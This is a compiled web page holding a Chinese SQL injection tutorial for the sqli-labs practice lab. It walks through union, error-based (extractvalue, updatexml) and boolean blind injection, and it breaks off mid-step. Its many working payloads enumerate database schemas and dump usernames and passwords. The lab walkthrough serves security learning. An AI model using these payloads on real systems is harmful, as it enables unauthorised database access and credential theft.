import{_ as p}from"./chunks/ArticleMetadata.b0aiu0_k.js";import{_ as t,D as e,o as h,c as d,I as r,w as g,k as n,a as F,R as y,b as C,e as A}from"./chunks/framework.77Q1d7_Q.js";import"./chunks/md5.C07ep1QO.js";const x=JSON.parse('{"title":"SQL注入","description":"","frontmatter":{"title":"SQL注入","author":"Seso","date":"2024/05/6 10:05","categories":["SQL注入","sqli-labs"],"tags":["SQL注入","sqli-labs"]},"headers":[],"relativePath":"categories/technic/SQL注入/SQL注入详解.md","filePath":"categories/technic/SQL注入/SQL注入详解.md","lastUpdated":1730996395000}'),c={name:"categories/technic/SQL注入/SQL注入详解.md"},D=n("h1",{id:"sql注入",tabindex:"-1"},[F("SQL注入 "),n("a",{class:"header-anchor",href:"#sql注入","aria-label":'Permalink to "SQL注入"'},"​")],-1),o=y(`<h2 id="一、环境说明" tabindex="-1">一、环境说明 <a class="header-anchor" href="#一、环境说明" aria-label="Permalink to &quot;一、环境说明&quot;">​</a></h2><p>sqli-labs的开源项目地址：<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noreferrer">https://github.com/Audi-1/sqli-labs</a></p><p>如下是使用docker部署的sqli-labs靶场环境</p><div class="tip custom-block"><p class="custom-block-title">sqli-labs环境搭建</p><ol><li>拉取docker的镜像</li></ol><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark-dimmed vp-code"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">┌──(root㉿DESKTOP-QSJ4HQV</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">)-[~]</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">└─#</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> docker</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> pull</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> acgpiano/sqli-labs</span></span></code></pre></div><ol start="2"><li>然后使用docker run命令部署当前的靶机环境</li></ol><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark-dimmed vp-code"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">┌──(root㉿DESKTOP-QSJ4HQV</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">)-[~]</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">└─#</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> docker</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> run</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> -d</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> -it</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> -p</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> 80</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">:80</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> acgpiano/sqli-labs:latest</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">c3849946776047b738ea0acea9d6493b5dfaa567a57cd9c5e793119d90dfaf6a</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">┌──(root㉿DESKTOP-QSJ4HQV</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">)-[~]</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">└─#</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> docker</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> ps</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;"> CONTAINER</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> ID</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">   IMAGE</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">                       COMMAND</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">     CREATED</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">        STATUS</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">        PORTS</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">             NAMES</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">c38499467760</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">   acgpiano/sqli-labs:latest</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">   &quot;/run.sh&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">   1</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> second</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> ago</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">   Up</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> 1</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> second</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">   0.0</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">.0.0:80</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">-</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">&gt;</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">80/tcp,</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> :::80</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">-</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">&gt;</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">80/tcp,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> 3306</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">/tcp</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">   loving_wu</span></span></code></pre></div></div><h2 id="二、sql注入基本步骤" tabindex="-1">二、SQL注入基本步骤 <a class="header-anchor" href="#二、sql注入基本步骤" aria-label="Permalink to &quot;二、SQL注入基本步骤&quot;">​</a></h2><h3 id="_2-1-注入流程" tabindex="-1">2.1 注入流程 <a class="header-anchor" href="#_2-1-注入流程" aria-label="Permalink to &quot;2.1 注入流程&quot;">​</a></h3><blockquote><p>思路流程：</p></blockquote><ol><li>查找注入点</li><li>判断是字符型还是数字型注入 and 1=1 1=2 / 3-1</li><li>如果是字符型，找到他的闭合方式 <code>&#39;</code>、<code>&quot;</code>、<code>&#39;)</code>、<code>&quot;)</code></li><li>判断查询列数，group by或者使用order by都可以</li><li>查询回显位置：-1</li></ol><p><strong>闭合的作用</strong></p><p>手工提交闭合符号，结束前一段查询语句，后面即可加入其他语句，查询需要的参数不需要的语句可以用注释符号<code>--+</code>或<code>#</code>或<code>%23</code>注释掉</p><p>注释掉：<strong>利用注释符号暂时将程序段脱离运行。把某段程序“注释掉”，就是让它暂时不运行（而非删除掉）</strong></p><h3 id="_2-2-union联合注入" tabindex="-1">2.2 union联合注入 <a class="header-anchor" href="#_2-2-union联合注入" aria-label="Permalink to &quot;2.2 union联合注入&quot;">​</a></h3><p>我这里使用的是level-1的靶场，然后测试使用union联合注入</p><p><img src="https://blog-1304715799.cos.ap-nanjing.myqcloud.com/imgs/image-20240506141538687.png?imageSlim" alt="image-20240506141538687"></p><p>这里测试的是有3列。</p><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki shiki-themes github-light github-dark-dimmed vp-code"><code><span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">http</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">:</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">//</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">localhost</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">/</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">Less</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">-</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">/</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">index</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">.</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">php</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">?id</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">&#39; group by 3--+</span></span></code></pre></div><p>然后使用union联合注入查询：</p><ul><li>-1是为了能够查询回显位</li><li>通过group by判断查询的列，然后使用union去查询回显版本和数据库</li></ul><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki shiki-themes github-light github-dark-dimmed vp-code"><code><span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">union</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;"> select</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> 1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">2</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">3</span><span style="--shiki-light:#6A737D;--shiki-dark:#768390;">--+</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">http</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">:</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">//</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">localhost</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">/</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">Less</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">-</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">/</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">index</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">.</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">php</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">?id</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=-</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">&#39; union select 1,version(),database()--+</span></span></code></pre></div><div class="tip custom-block"><p class="custom-block-title">深入了解union注入过程</p><ul><li>用到的关键数据库、数据表、数据列</li><li>sql查询中group_concat的作用</li></ul></div><p><strong>拿到表名和列名</strong></p><p>如果使用单引号<code>&#39;</code>闭合，可以使用--+。</p><p><img src="https://blog-1304715799.cos.ap-nanjing.myqcloud.com/imgs/image-20240506145019010.png?imageSlim" alt="image-20240506145019010"></p><p>所需要表名信息在数据库information_schema-&gt;数据表tables-&gt;数据列table_name。</p><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki shiki-themes github-light github-dark-dimmed vp-code"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">id</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">0</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">&#39; union select 1,table_name,3 from information_schema.tables--+</span></span></code></pre></div><p>过滤security数据库中的表名，即table_schema为security的行</p><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki shiki-themes github-light github-dark-dimmed vp-code"><code><span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">&#39; union select 1,table_name,3 from information_schema.tables where table_schema=database()--+</span></span></code></pre></div><p>但是我要确保所有的查询信息能放到一行显示出来：</p><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki shiki-themes github-light github-dark-dimmed vp-code"><code><span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+</span></span></code></pre></div><p>最后的结果是如图：</p><p><img src="https://blog-1304715799.cos.ap-nanjing.myqcloud.com/imgs/image-20240506145953655.png?imageSlim" alt="image-20240506145953655"></p><p>但是如上并不完整，所以需要还需要查询当前的列</p><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki shiki-themes github-light github-dark-dimmed vp-code"><code><span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">users</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">&#39;--+</span></span></code></pre></div><h3 id="_2-3-数字型union注入" tabindex="-1">2.3 数字型union注入 <a class="header-anchor" href="#_2-3-数字型union注入" aria-label="Permalink to &quot;2.3 数字型union注入&quot;">​</a></h3><img src="https://blog-1304715799.cos.ap-nanjing.myqcloud.com/imgs/image-20240506150751216.png?imageSlim" alt="image-20240506150751216"><p>这里的环境使用level-2</p><p><img src="https://blog-1304715799.cos.ap-nanjing.myqcloud.com/imgs/image-20240506151119505.png?imageSlim" alt="image-20240506151119505"></p><p>然后使用group by查看当前的列数：</p><blockquote><p>注意： 这里是数字类型可以不需要封闭</p></blockquote><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki shiki-themes github-light github-dark-dimmed vp-code"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">id</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">2</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;"> group by</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> 3</span><span style="--shiki-light:#6A737D;--shiki-dark:#768390;">--+</span></span></code></pre></div><p>然后配合union</p><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki shiki-themes github-light github-dark-dimmed vp-code"><code><span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">0</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;"> union</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;"> select</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> 1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">database</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">(),</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">version</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">()</span><span style="--shiki-light:#6A737D;--shiki-dark:#768390;">--+</span></span></code></pre></div><p>然后其他的操作都是和如上一样。</p><p>如果括号中存在sql命令，会优先执行括号里面的，比如下面这种：</p><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki shiki-themes github-light github-dark-dimmed vp-code"><code><span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">0</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;"> union</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;"> select</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> 1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,(</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">select</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> group_concat(table_name) </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">from</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> information_schema</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">.</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">tables</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;"> where</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> table_schema</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">&#39;security&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">),</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">3</span><span style="--shiki-light:#6A737D;--shiki-dark:#768390;"> --+</span></span></code></pre></div><p>然后查询所有的用户和密码：</p><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki shiki-themes github-light github-dark-dimmed vp-code"><code><span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">0</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;"> union</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;"> select</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> 1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,group_concat(username,</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">password</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">),</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">2</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;"> from</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> users </span><span style="--shiki-light:#6A737D;--shiki-dark:#768390;">--+</span></span></code></pre></div><h2 id="三、报错注入" tabindex="-1">三、报错注入 <a class="header-anchor" href="#三、报错注入" aria-label="Permalink to &quot;三、报错注入&quot;">​</a></h2><h3 id="_3-1-什么是报错注入" tabindex="-1">3.1 什么是报错注入？ <a class="header-anchor" href="#_3-1-什么是报错注入" aria-label="Permalink to &quot;3.1 什么是报错注入？&quot;">​</a></h3><p><strong>报错注入</strong>是一种SQL注入类型，用于使SQL语句报错的语法，用于注入结果无回显但错误信息有输出的情况。返回的错误信息即是攻击者需要的信息。所以当我们没有回显位时可以考虑报错注入这种方法来进行渗透测试。接下来带给大家常用的三种报错注入函数。</p><p>常见的报错注入：</p><ol><li>通过floor()报错注入</li><li>通过extractValue() 报错注入</li><li>通过updateXml()报错注入</li><li>通过NAME_CONST() 报错注入</li><li>通过jion()报错注入</li><li>通过exp()报错注入</li></ol><p>类似于这样的报错提示。</p><p><img src="https://blog-1304715799.cos.ap-nanjing.myqcloud.com/imgs/image-20240506180724537.png?imageSlim" alt="image-20240506180724537"></p><h3 id="_3-2-利用extractvalue-报错注入" tabindex="-1">3.2 利用extractValue()报错注入 <a class="header-anchor" href="#_3-2-利用extractvalue-报错注入" aria-label="Permalink to &quot;3.2 利用extractValue()报错注入&quot;">​</a></h3><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki shiki-themes github-light github-dark-dimmed vp-code"><code><span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">100</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;"> and</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> 1</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">extractvalue(</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">concat</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">(0x7e,(</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">select</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> group_concat(table_name) </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">from</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> information_schema</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">.</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">tables</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;"> where</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> table_schema</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=database</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">()))) </span><span style="--shiki-light:#6A737D;--shiki-dark:#768390;">--+</span></span></code></pre></div><p>然后虽然页面提示的是报错信息，但是已经包含了数据表：</p><p><img src="https://blog-1304715799.cos.ap-nanjing.myqcloud.com/imgs/image-20240506181528697.png?imageSlim" alt="image-20240506181528697"></p><p>然后可以通过如下去查询当前的一些字段：</p><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki shiki-themes github-light github-dark-dimmed vp-code"><code><span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">100</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;"> and</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> 1</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">extractvalue(</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">concat</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">(0x7e,(</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">select</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> group_concat(column_name) </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">from</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> information_schema</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">.</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">columns</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;"> where</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> table_schema</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=database</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">() </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">and</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> table_name</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">&#39;users&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">))) </span><span style="--shiki-light:#6A737D;--shiki-dark:#768390;">--+</span></span></code></pre></div><p>但是默认只能返回32个字符串，所以这里需要使用substring解决这个问题：</p><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki shiki-themes github-light github-dark-dimmed vp-code"><code><span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">100</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;"> and</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> 1</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">extractvalue(</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">concat</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">(0x7e,(</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">select</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> substring</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">(group_concat(username,</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">&#39;~&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">password</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">),</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">25</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">30</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">) </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">from</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> users))) </span><span style="--shiki-light:#6A737D;--shiki-dark:#768390;">--+</span></span></code></pre></div><h3 id="_3-3-利用updatexml-报错注入" tabindex="-1">3.3 利用updatexml()报错注入 <a class="header-anchor" href="#_3-3-利用updatexml-报错注入" aria-label="Permalink to &quot;3.3 利用updatexml()报错注入&quot;">​</a></h3><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki shiki-themes github-light github-dark-dimmed vp-code"><code><span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">&quot; and 1=updatexml(1,concat(&#39;~&#39;,(select group_concat(table_name) from information_schema.tables where table_schema = database())),3)--+</span></span></code></pre></div><p><img src="https://blog-1304715799.cos.ap-nanjing.myqcloud.com/imgs/image-20240506183524025.png?imageSlim" alt="image-20240506183524025"></p><h2 id="四、布尔盲注" tabindex="-1">四、布尔盲注 <a class="header-anchor" href="#四、布尔盲注" aria-label="Permalink to &quot;四、布尔盲注&quot;">​</a></h2><h3 id="_4-1-基本概念" tabindex="-1">4.1 基本概念 <a class="header-anchor" href="#_4-1-基本概念" aria-label="Permalink to &quot;4.1 基本概念&quot;">​</a></h3><p>盲注：页面没有报错回显，不知道数据库具体返回值的情况下，对数据库中的内容进行猜解，实行SQL注入。</p><div class="tip custom-block"><p class="custom-block-title">盲注分类</p><ul><li>布尔盲注</li><li>时间盲注</li><li>报错盲注</li></ul></div><p>布尔盲注：web页面只返回True真，False假两种类型。利用页面返回不同，逐个猜解数据。</p><h3 id="_4-2-布尔盲注" tabindex="-1">4.2 布尔盲注 <a class="header-anchor" href="#_4-2-布尔盲注" aria-label="Permalink to &quot;4.2 布尔盲注&quot;">​</a></h3><p><strong>布尔盲注常用函数</strong></p><ul><li><code>length(select database())&gt;5 </code>里可以放查询语句,用来判断查询结果的长度</li><li><code>exists( )</code> 里可以放查询语句,用来判断查询结果是否存在</li><li><code>ascii( ) </code> 里可以放查询语句,用来把查询结果转换为ascii的值</li><li><code>substr( string,pos,length)</code> 用来截取查询结果,string可以用查询语句代替,pos表示截取位置–下标从1开始,length表示截取的长度</li></ul><blockquote><p><strong>布尔盲注的一般步骤</strong></p></blockquote><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark-dimmed vp-code"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">1、判断数据库名的长度：</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">	and</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> length</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">(</span><span style="--shiki-light:#6F42C1;--shiki-dark:#DCBDFB;">database</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">())</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">&gt;</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">7</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> 回显正常；</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">	and</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> length</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">(</span><span style="--shiki-light:#6F42C1;--shiki-dark:#DCBDFB;">database</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">())</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">&gt;</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">8</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> 回显错误，说明数据库名是等于8个字符。</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">2、猜测数据库名（使用ascii码来依次判断）：</span></span>
